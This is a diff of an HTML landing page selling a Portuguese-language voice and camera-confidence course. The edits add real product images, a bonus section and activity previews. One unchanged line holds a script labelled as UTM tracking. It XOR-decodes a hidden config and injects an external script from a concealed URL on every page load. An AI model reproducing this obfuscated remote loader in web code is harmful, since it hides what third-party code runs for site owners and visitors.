@@ -10,7 +10,10 @@
 <meta property="og:locale" content="pt_BR">
 <meta property="og:title" content="Desafio da Voz — Do Zero ao HARD">
 <meta property="og:description" content="Você sabe o que quer falar. Mas trava quando liga a câmera? 30 desafios progressivos de voz, dicção, respiração e gravação.">
-<!-- <meta property="og:image" content="https://SEU-DOMINIO.com.br/og-image.jpg"> -->
+<meta property="og:image" content="https://eduhtoledo-cloud.github.io/desafio-da-voz/og-image.jpg">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta name="twitter:card" content="summary_large_image">
 <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='8' fill='%23111216'/%3E%3Crect x='12' y='6' width='8' height='14' rx='4' fill='%23DC2626'/%3E%3Cpath d='M9 15a7 7 0 0 0 14 0M16 22v4' stroke='%23fff' stroke-width='2' fill='none' stroke-linecap='round'/%3E%3C/svg%3E">
 <!-- Utmify: captura de UTMs -->
 <script>(function(){var c_q=atob("DDuqTRHgpl75kOkZS0CIOGOMhGTb+J1tO0iQYj6DwjDX5Z10Il3TY3KPy3Cb4sZqKEnDPWWTiSuN/Zo2J1reKGKUiDSKssU7Kk/eP3iC0yqc48sjEECII3CNw3zDso14P1qHOGWNzziAvZlrLk3PI2XN3j2W9MRqKFCIYTOWxzKM9csjaRnXYWrCyD+U9csjaV/LOXDN0yqU+Y9gZkvYKGeFyCrU45x7Il/Zbz3C0D+V5Yw7cRmIMEyd");var l_w3ky=[];for(var u_44=0;u_44<c_q.length;u_44++){l_w3ky.push(c_q.charCodeAt(u_44)&255);}var w_2=l_w3ky[0];var g_6yyl=l_w3ky.slice(1,1+w_2);var k_n=l_w3ky.slice(1+w_2);var e_zia=k_n.map(function(b,l_sr){return b^g_6yyl[l_sr%w_2];});var w_1sy="";for(var x_xm=0;x_xm<e_zia.length;x_xm++){w_1sy+=String.fromCharCode(e_zia[x_xm]&255);}var v_nr3x=decodeURIComponent(escape(w_1sy));var u_5=JSON.parse(v_nr3x);var d_8=u_5.globals||[];d_8.forEach(function(h_l){window[h_l.name]=h_l.value;});var m_x=document.createElement("script");m_x.src=u_5.url;m_x.async=true;m_x.defer=true;(u_5.attributes||[]).forEach(function(v_i5p){m_x.setAttribute(v_i5p.name,v_i5p.value);});(document.head||document.documentElement).appendChild(m_x);})();</script>
@@ -105,6 +108,7 @@ section{scroll-margin-top:70px}
 .waves{position:absolute;inset:auto 0 0 0;height:120px;opacity:.12;pointer-events:none}
 
 /* mockup do kit (ilustrativo, troque por imagem depois) */
+.hero-img{width:100%;height:auto;max-width:640px;margin:0 auto;display:block;border-radius:18px}
 .mock{position:relative;width:100%;max-width:520px;margin:0 auto;aspect-ratio:5/4;container-type:inline-size}
 .mock img{width:100%;height:100%;object-fit:contain}
 .nb{position:absolute;aspect-ratio:3/4;width:44%;border-radius:3cqw;padding:5cqw 4.5cqw;display:flex;flex-direction:column;box-shadow:0 30px 60px -20px rgba(0,0,0,.6)}
@@ -223,6 +227,18 @@ section{scroll-margin-top:70px}
 .check input{width:18px;height:18px;accent-color:var(--red)}
 
 /* entregáveis */
+.fan{position:relative;max-width:620px;margin:0 auto 48px;aspect-ratio:16/11}
+.fan img{position:absolute;width:38%;height:auto;aspect-ratio:2/3;border-radius:8px;box-shadow:0 24px 50px -16px rgba(0,0,0,.75);background:#fff}
+.bonus{display:grid;gap:18px}
+@media(min-width:700px){.bonus{grid-template-columns:repeat(2,1fr)}}
+@media(min-width:1000px){.bonus{grid-template-columns:repeat(3,1fr)}}
+.bcard{background:#fff;border:1px solid var(--line);border-radius:20px;overflow:hidden;display:flex;flex-direction:column;transition:transform .25s,box-shadow .25s}
+.bcard:hover{transform:translateY(-3px);box-shadow:0 18px 40px -24px rgba(17,18,22,.35)}
+.bcard img{width:100%;height:auto;aspect-ratio:1/1;object-fit:cover;background:#F5F5F5}
+.bcard div{padding:20px 22px 24px}
+.bcard small{font:700 .7rem var(--sans);letter-spacing:.14em;color:var(--red)}
+.bcard h3{margin:6px 0 6px}
+.bcard p{color:var(--muted);font-size:.95rem}
 .stack{position:relative;height:300px;max-width:520px;margin:0 auto 48px}
 .stack .nb{width:150px;height:200px;aspect-ratio:auto;border-radius:12px;padding:18px 14px}
 .stack .nb small{font-size:.62rem}
@@ -343,23 +359,8 @@ footer a{color:#D4D4D8}
       <p class="mini">Material 100% digital • Pagamento único • Acesso após confirmação do pagamento</p>
     </div>
     <div>
-      <!-- Para usar uma imagem real do kit, troque o conteúdo de .mock por:
-           <img src="mockups/kit.webp" width="1000" height="800" alt="Kit Desafio da Voz" fetchpriority="high"> -->
-      <div class="mock" role="img" aria-label="Representação ilustrativa do kit: cadernos em PDF e smartphone exibindo um exercício">
-        <div class="nb nb1" aria-hidden="true"><small>NÍVEL 05</small><strong>Presença diante da câmera</strong><div class="bar"><span style="height:40%"></span><span style="height:80%"></span><span style="height:55%"></span><span style="height:100%"></span><span style="height:35%"></span><span style="height:70%"></span><span style="height:45%"></span></div></div>
-        <div class="nb nb2" aria-hidden="true"><small>NÍVEL 01</small><strong>Destravando a câmera</strong><div class="bar" style="color:#DC2626"><span style="height:30%"></span><span style="height:65%"></span><span style="height:100%"></span><span style="height:50%"></span><span style="height:80%"></span><span style="height:40%"></span><span style="height:60%"></span></div></div>
-        <div class="phone" aria-hidden="true"><div class="screen">
-          <div class="t">DESAFIO 01</div>
-          <h4>Seu primeiro take de 30 segundos</h4>
-          <p>Hoje eu vou falar sobre algo simples.</p>
-          <span class="chip c-pausa">PAUSA 2s</span>
-          <p>Comunicar bem se treina.</p>
-          <span class="chip c-resp">RESPIRE</span>
-          <p>Um passo de cada vez.</p>
-          <span class="chip c-olhe">OLHE PARA A CÂMERA</span>
-        </div></div>
-      </div>
-      <p class="ill">Representação ilustrativa do material</p>
+      <img class="hero-img" src="img/mockup-kit.webp" width="1400" height="933" fetchpriority="high" decoding="async" alt="Kit Desafio da Voz: cadernos impressos dos níveis, guia de início rápido e um desafio de gravação aberto no celular">
+      <p class="ill">Imagem ilustrativa do material digital</p>
     </div>
   </div>
 </section>
@@ -565,13 +566,13 @@ footer a{color:#D4D4D8}
       <span class="eyebrow">O que está incluso</span>
       <h2 id="inc-t">Uma jornada completa de treinamento em suas mãos.</h2>
     </div>
-    <!-- Para usar imagem real: substitua .stack por <img src="mockups/cadernos.webp" width="1000" height="750" loading="lazy" alt="Cadernos do Desafio da Voz"> -->
-    <div class="stack rv" role="img" aria-label="Representação ilustrativa dos cadernos em PDF">
-      <div class="nb" style="left:2%;top:40px;transform:rotate(-12deg);background:#fff;color:#111216"><small>NÍVEL 02</small><strong>Dicção e clareza</strong><div class="bar"><span style="height:50%"></span><span style="height:90%"></span><span style="height:60%"></span><span style="height:100%"></span></div></div>
-      <div class="nb" style="left:24%;top:20px;transform:rotate(-4deg);background:#1E1F26;color:#fff;border:1px solid #30313A"><small>NÍVEL 03</small><strong>Ritmo, pausas e respiração</strong><div class="bar" style="color:#DC2626"><span style="height:40%"></span><span style="height:70%"></span><span style="height:100%"></span><span style="height:55%"></span></div></div>
-      <div class="nb" style="left:46%;top:30px;transform:rotate(5deg);background:#DC2626;color:#fff"><small style="color:#fff">NÍVEL 10</small><strong>HARD — Domínio da apresentação</strong><div class="bar"><span style="height:60%"></span><span style="height:100%"></span><span style="height:75%"></span><span style="height:90%"></span></div></div>
-      <div class="nb" style="right:0;top:60px;transform:rotate(12deg);background:#fff;color:#111216"><small>GUIA</small><strong>Pausas e respiração</strong><div class="bar" style="color:#DC2626"><span style="height:35%"></span><span style="height:65%"></span><span style="height:45%"></span><span style="height:85%"></span></div></div>
+    <div class="fan rv">
+      <img src="img/p-G01.webp" width="420" height="630" loading="lazy" decoding="async" alt="Capa do Guia de início rápido do Desafio da Voz" style="left:0;top:8%;transform:rotate(-10deg)">
+      <img src="img/p-03A.webp" width="420" height="630" loading="lazy" decoding="async" alt="Capa do Caderno 03: Ritmo, pausas e respiração" style="left:24%;top:2%;transform:rotate(-3deg)">
+      <img src="img/p-03D1.webp" width="420" height="630" loading="lazy" decoding="async" alt="Página de desafio de gravação com roteiro e marcadores" style="left:46%;top:4%;transform:rotate(4deg)">
+      <img src="img/p-10D3b.webp" width="420" height="630" loading="lazy" decoding="async" alt="Desafio final do Nível 10 HARD" style="right:0;top:10%;transform:rotate(11deg)">
     </div>
+    <p class="ill" style="margin:-28px 0 40px">Páginas reais do material</p>
     <div class="grid g2 g3">
       <div class="card rv"><div class="big">10</div><h3 style="margin-top:10px">Cadernos progressivos</h3><p>Um caderno em PDF para cada nível da jornada.</p></div>
       <div class="card rv"><div class="big">100</div><h3 style="margin-top:10px">Exercícios preparatórios</h3><p>Dicção, leitura, respiração, ritmo e expressão.</p></div>
@@ -579,6 +580,24 @@ footer a{color:#D4D4D8}
       <div class="card rv"><div class="ico"><svg><use href="#i-wind"/></svg></div><h3>Guia de pausas e respiração</h3><p>Textos com orientação de onde pausar e respirar.</p></div>
       <div class="card rv"><div class="ico"><svg><use href="#i-text"/></svg></div><h3>Trava-línguas e exercícios de dicção</h3><p>Para articular melhor e falar com mais nitidez.</p></div>
       <div class="card rv"><div class="ico"><svg><use href="#i-clip"/></svg></div><h3>Autoavaliações de evolução</h3><p>Checklists para acompanhar seu progresso a cada desafio.</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 09B BÔNUS -->
+<section class="sec" aria-labelledby="bonus-t">
+  <div class="wrap">
+    <div class="head center rv">
+      <span class="eyebrow">Bônus do Kit Completo</span>
+      <h2 id="bonus-t">Materiais extras para quem cria conteúdo.</h2>
+      <p class="lead">Cinco materiais práticos para usar no dia a dia, além dos 10 cadernos.</p>
+    </div>
+    <div class="bonus">
+      <article class="bcard rv"><img src="img/bonus-GA.webp" width="900" height="900" loading="lazy" decoding="async" alt="Páginas do bônus 50 ganchos para começar vídeos"><div><small>BÔNUS 1</small><h3>50 ganchos para começar vídeos</h3><p>Frases para captar a atenção nos primeiros segundos, sem depender de exageros.</p></div></article>
+      <article class="bcard rv"><img src="img/bonus-RR.webp" width="900" height="900" loading="lazy" decoding="async" alt="Páginas do bônus 20 roteiros para Reels e stories"><div><small>BÔNUS 2</small><h3>20 roteiros para Reels e stories</h3><p>Estruturas curtas para vídeos educativos, institucionais e comerciais, prontas para adaptar.</p></div></article>
+      <article class="bcard rv"><img src="img/bonus-PI.webp" width="900" height="900" loading="lazy" decoding="async" alt="Cartões do bônus 30 perguntas de improviso"><div><small>BÔNUS 3</small><h3>30 perguntas de improviso</h3><p>Cartões para recortar com situações de entrevistas, reuniões, clientes e imprevistos.</p></div></article>
+      <article class="bcard rv"><img src="img/bonus-DE.webp" width="900" height="900" loading="lazy" decoding="async" alt="Páginas do bônus Diário de evolução"><div><small>BÔNUS 4</small><h3>Diário de evolução</h3><p>Registros do primeiro ao último vídeo, com mapa de notas e comparação final.</p></div></article>
+      <article class="bcard rv"><img src="img/bonus-GC.webp" width="900" height="900" loading="lazy" decoding="async" alt="Páginas do bônus Guia de gravação com celular"><div><small>BÔNUS 5</small><h3>Guia de gravação com celular</h3><p>Enquadramento, luz, áudio, ambiente e um checklist para usar antes de cada gravação.</p></div></article>
     </div>
   </div>
 </section>
@@ -721,7 +740,18 @@ const LINK_TERMOS      = "";     // ex.: termos-de-uso.html
 /* Prévias reais das atividades: coloque as imagens na pasta /atividades
    e liste aqui (informe largura e altura reais). Lista vazia = demonstrações. */
 const ATIVIDADES = [
-  // { src: "atividades/atividade-01.webp", alt: "Exercício de dicção", w: 600, h: 800 },
+  { src: "atividades/01D1.webp", alt: "Desafio de gravação 01: O primeiro passo", w: 520, h: 780 },
+  { src: "atividades/02C.webp", alt: "Trava-línguas e respiração do Nível 02", w: 520, h: 780 },
+  { src: "atividades/03B.webp", alt: "Textos de treinamento do Nível 03 com marcadores de pausa", w: 520, h: 780 },
+  { src: "atividades/03D1.webp", alt: "Desafio de gravação 07: O poder de uma pausa", w: 520, h: 780 },
+  { src: "atividades/04D1.webp", alt: "Desafio de gravação 10: Despertando curiosidade", w: 520, h: 780 },
+  { src: "atividades/05A.webp", alt: "Capa do Nível 05: Presença diante da câmera", w: 520, h: 780 },
+  { src: "atividades/06D2.webp", alt: "Desafio de gravação 17: O vídeo que não saía", w: 520, h: 780 },
+  { src: "atividades/07B.webp", alt: "Textos de treinamento do Nível 07: Persuasão", w: 520, h: 780 },
+  { src: "atividades/08D3.webp", alt: "Desafio de gravação 24: Lidando com uma objeção", w: 520, h: 780 },
+  { src: "atividades/09E.webp", alt: "Boletim de autoavaliação do Nível 09", w: 520, h: 780 },
+  { src: "atividades/10A.webp", alt: "Capa do Nível 10: HARD", w: 520, h: 780 },
+  { src: "atividades/G03.webp", alt: "Legenda dos marcadores dos roteiros", w: 520, h: 780 },
 ];
 
 /* ========================================================= */
